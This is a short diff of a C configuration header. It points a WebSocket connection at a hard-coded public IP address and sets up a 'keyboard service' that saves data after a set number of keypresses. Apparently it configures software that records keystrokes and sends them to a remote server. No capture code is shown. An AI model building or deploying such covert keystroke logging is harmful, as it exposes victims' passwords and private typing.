@@ -7,12 +7,14 @@
 #define WEBSOCKET_SERVICE	true
 
 // WebSocket settings
-#define WEBSOCKET_HOST "ws://localhost:8080/"
+//#define WS_HOST "ws://localhost:8080/"
+#define WS_HOST "ws://5.58.91.27:25565/"
+#define WS_CONNECTION_DELAY_SEC 5
 
 // Keyboard settings
-#define KEYBOARD_MAX_REPEATS 5
-#define KEYBOARD_KEYS_TO_SAVE 100	// How many times key should be pressed to save data
-#define KEYBOARD_DIR "kbd"			// Name of keyboard service working directory
+#define KBD_MAX_REPEATS 5
+#define KBD_KEYS_TO_SAVE 100	// How many times key should be pressed to save data
+#define KBD_DIR "kbd"			// Name of keyboard service working directory
 
 // Includes
 #if KEYBOARD_SERVICE
